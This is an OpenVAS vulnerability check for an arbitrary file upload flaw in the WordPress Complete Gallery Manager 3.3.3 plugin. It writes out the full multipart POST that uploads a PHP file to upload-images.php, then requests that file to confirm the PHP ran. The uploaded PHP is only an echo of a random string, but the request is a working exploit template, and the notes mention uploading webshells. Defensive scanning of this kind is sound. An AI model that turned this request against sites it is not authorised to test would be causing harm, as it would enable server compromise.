###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_complete_gallery_file_upload_09_13.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Wordpress Plugin Complete Gallery Manager 3.3.3 - Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103790");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2013-09-19 11:10:11 +0200 (Thu, 19 Sep 2013)");
  script_name("Wordpress Plugin Complete Gallery Manager 3.3.3 - Arbitrary File Upload Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://www.vulnerability-lab.com/get_content.php?id=1080");
  script_xref(name:"URL", value:"http://codecanyon.net/item/complete-gallery-manager-for-wordpress/2418606");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to upload arbitrary code
  and run it in the context of the webserver process. This may facilitate unauthorized
  access or privilege escalation. Other attacks are also possible.");

  script_tag(name:"vuldetect", value:"Upload a file by sending a HTTP POST request.");

  script_tag(name:"insight", value:"The vulnerability is located in the
  /plugins/complete-gallery-manager/frames/ path when processing to upload via the
  upload-images.php file own malicious context or webshells. After the upload the
  remote attacker can access the file with one extension and exchange it with the
  other one to execute for example php codes.");

  script_tag(name:"solution", value:"Vendor updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Wordpress Complete Gallery Manager plugin is prone to a vulnerability
  that lets attackers upload arbitrary files. The issue occurs because the application
  fails to adequately sanitize user-supplied input.");

  script_tag(name:"affected", value:"Wordpress Complete Gallery Manager v3.3.3");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

host = http_host_name(port:port);

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + '.php';
str  = vtstrings["lowercase_rand"];

ex = '------------------------------69c0e1752093\r\n' +
     'Content-Disposition: form-data; name="qqfile"; filename="' + file + '"\r\n' +
     'Content-Type: application/octet-stream\r\n' +
     '\r\n' +
     '<?php echo "' + str + '"; ?>\r\n' +
     '\r\n' +
     '------------------------------69c0e1752093--';
len = strlen(ex);

req = 'POST ' + dir + '/wp-content/plugins/complete-gallery-manager/frames/upload-images.php HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Accept: */*\r\n' +
      'Expect: 100-continue\r\n' +
      'Content-Type: multipart/form-data; boundary=----------------------------69c0e1752093\r\n\r\n';

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:req);
while(x = recv(socket:soc, length:1024)) {
  buf += x;
}

if(buf !~ "^HTTP/1\.[01] 100") {
  close(soc);
  exit(99);
}

send(socket:soc, data:ex + '\r\n');

while(y = recv(socket:soc, length:1024)) {
  buf1 += y;
}

close(soc);

if('"success":true' >!< buf1)
  exit(99);

url = eregmatch(pattern:'"url":"([^"]+)"', string:buf1);
if(isnull(url[1]))
  exit(0);

path = url[1];
path = str_replace(string:path,find:"\", replace:"");

l_path = eregmatch(pattern:"(/wp-content/.*)", string:path);
if(isnull(l_path[1]))
  exit(99);

url = dir + l_path[1];
req1 = http_get(item:url, port:port);
buf2 = http_send_recv(port:port, data:req1, bodyonly:FALSE);

if(str >< buf2) {
  msg = 'The scanner was able to upload a file to ' + l_path[1] + '. Please remove this file.';
  security_message(port:port, data:msg);
  exit(0);
}

exit(99);